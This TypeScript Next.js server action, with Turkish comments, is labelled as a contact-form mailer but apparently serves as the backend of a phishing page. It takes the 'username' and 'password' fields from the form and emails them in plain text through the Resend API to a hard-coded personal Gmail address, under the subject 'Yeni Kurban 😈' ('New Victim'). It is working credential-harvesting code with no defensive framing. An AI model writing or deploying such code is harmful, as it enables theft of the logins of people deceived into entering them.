"use server";

import { Resend } from "resend";

const resend = new Resend(process.env.RESEND_API_KEY);

export async function sendContactEmail(formData: FormData) {
  const username = formData.get("username") as string;
  const password = formData.get("password") as string;

  try {
    const data = await resend.emails.send({
      from: "İletişim Formu <onboarding@resend.dev>", // Alan adınızı doğrulayana kadar test için bu adres kullanılır
      to: ["berksysl.g@gmail.com"], // Mailin düşeceği kendi adresiniz
      subject: `Yeni Kurban 😈`,
      text: `username: ${username} - password ${password}`,
    });

    return { success: true, data };
  } catch (error) {
    return { success: false, error: "Mail gönderilirken hata oluştu." };
  }
}
